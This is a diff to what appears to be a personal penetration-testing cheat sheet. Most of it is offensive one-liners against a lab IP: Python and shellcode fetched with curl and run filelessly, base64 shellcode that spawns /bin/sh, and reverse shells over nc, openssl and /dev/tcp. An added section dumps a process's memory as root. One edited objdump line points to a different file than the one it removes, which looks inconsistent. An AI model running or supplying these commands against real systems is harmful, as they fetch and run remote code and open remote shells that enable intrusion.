@@ -19,14 +19,14 @@ FORK=1 python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpr
 Run shellcode from command line. First you need some base64-encoded shellcode:
 ```bash
 nasm -f elf64 -o /tmp/shellcode.o shellcode.asm; ld -o /tmp/shellcode /tmp/shellcode.o; rm /tmp/shellcode.o
-printf $(objdump -d /tmp/shellcode | egrep '^ ' | cut -f2 | sed -r -e 's/([0-9,a-f]{2})/\\x\1/g' -e 's/ //g' | tr -d '\n') | base64 | tr -d '\n'; echo; rm /tmp/shellcode
+printf $(objdump -d /tmp/PIC_binary | egrep '^ ' | cut -f2 | sed -r -e 's/([0-9,a-f]{2})/\\x\1/g' -e 's/ //g' | tr -d '\n') | base64 | tr -d '\n'; echo; rm /tmp/shellcode
 ```
 now we can run it (this simply spawns `/bin/sh`):
-```
+```bash
 python shellcode.py McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
 ```
 of course we could do some more interesting stuff with this, like for example:
-```
+```bash
 FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/shellcode.bin | base64 | tr -d '\n')
 ```
 
@@ -38,4 +38,11 @@ mkfifo /tmp/p;nc 10.10.14.3 8888 </tmp/p | /bin/bash > /tmp/p;rm /tmp/p
 mkfifo /tmp/p;openssl s_client -quiet 10.10.14.3:8443 2>/dev/null < /tmp/p|bash>/tmp/p;rm /tmp/p
 # tunneling over SSH (server listening on localhost:8080)
 ssh -fN -L48924:127.0.0.1:8080 10.10.14.3;/bin/bash -l > /dev/tcp/localhost/48924 0<&1 2>&1
+```
+
+## forensics and reverse engineering
+```bash
+# dump all process memory including shared libraries etc., copy mapping info and archive everything.
+# must be run as root (other users don't seem to be allowed to read memory)
+ export PID=107136;export OUTDIR=$(mktemp -d);cat /proc/$PID/maps | cut -d" " -f1 | awk -F'-' '{print "dd if=/proc/$PID/mem of=${OUTDIR}/${PID}_"$1".dump bs=1 skip=$(printf %u 0x"$1") count=$((0x"$2"-0x"$1"))"}' | xargs -I DIFF bash -c "DIFF";cp /proc/$PID/maps $OUTDIR/maps;cd $OUTDIR;ls -1|tar cvzf dump_$PID.tar.gz --files-from=/dev/stdin;rm *.dump maps
 ```
